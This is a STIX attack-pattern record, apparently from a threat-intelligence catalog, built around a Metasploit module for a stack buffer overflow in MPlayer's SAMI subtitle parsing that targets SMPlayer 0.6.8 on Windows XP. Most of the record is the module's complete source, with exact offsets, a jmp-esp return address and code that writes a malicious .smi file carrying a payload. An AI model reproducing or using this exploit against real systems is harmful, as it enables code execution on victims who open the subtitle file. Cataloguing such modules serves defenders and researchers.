{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ec29a506-3a89-4811-899c-352da61370a5",
    "created": "2024-08-14T16:35:26.525577Z",
    "modified": "2024-08-14T16:35:26.525581Z",
    "name": "MPlayer SAMI Subtitle File Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow found in the handling of SAMI subtitles files in MPlayer SVN Versions before 33471. It currently targets SMPlayer 0.6.8, which is distributed with a vulnerable version of MPlayer.  The overflow is triggered when an unsuspecting victim opens a movie file first followed by loading the malicious SAMI subtitles file from the GUI. Or, it can also be done from the console with the MPlayer \"-sub\" option.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/mplayer_sami_bof.rb",
            "external_id": "mplayer_sami_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://labs.mwrinfosecurity.com/files/Advisories/mwri_mplayer-sami-subtitles_2011-08-12.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MPlayer SAMI Subtitle File Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow found in the handling\n        of SAMI subtitles files in MPlayer SVN Versions before 33471. It currently\n        targets SMPlayer 0.6.8, which is distributed with a vulnerable version of MPlayer.\n\n        The overflow is triggered when an unsuspecting victim opens a movie file first,\n        followed by loading the malicious SAMI subtitles file from the GUI. Or, it can also\n        be done from the console with the MPlayer \"-sub\" option.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n        'Jacques Louw', # Vulnerability Discovery and PoC\n        'juan vazquez' # Metasploit module\n      ],\n      'References'     =>\n        [\n          [ 'BID', '49149' ],\n          [ 'OSVDB', '74604' ],\n          [ 'URL', 'http://labs.mwrinfosecurity.com/files/Advisories/mwri_mplayer-sami-subtitles_2011-08-12.pdf' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 4000,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x09\\x3c\\x3e\\x5c\\x22\\x7b\\x7d\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'SMPlayer 0.6.8 / mplayer.exe Sherpya-SVN-r29355-4.5.0 / Windows XP English SP3',\n            {\n              'Offset' => 1033,\n              'Ret' => 0x016c14df, # jmp esp from mplayer.exe .rsrc\n              'WritableAddress' => 0x013ab3ae # from mplayer.exe .bss\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-05-19',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME',   [ false, 'The file name.', 'msf.smi']),\n      ])\n  end\n\n  # Split the subtitle to avoid mplayer complaining\n  # about the line max length\n  def sami_encode(s)\n    r = \"\"\n    i = 0\n    while i < s.length\n      r << s[i, 32]\n      r << \"\\n\"\n      i += 32\n    end\n    r\n  end\n\n  def exploit\n\n    sploit = rand_text(target['Offset'])\n    sploit << [target.ret].pack(\"V\")\n    sploit << \"\\xeb\\x06\" # jmp short 0x8\n    sploit << rand_text(2)\n    sploit << [target['WritableAddress']].pack(\"V\")\n    sploit << payload.encoded\n\n    sami = \"<SAMI>\\n\"\n    sami << \"<BODY>\\n\"\n    sami << \"<SYNC Start=100550>\\n\"\n    sami << sami_encode(sploit)\n    sami << \"</SYNC>\\n\"\n    sami << \"</BODY>\\n\"\n    sami << \"</SAMI>\\n\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(sami)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-05-19",
    "x_mitre_platforms": [
        "win'"
    ]
}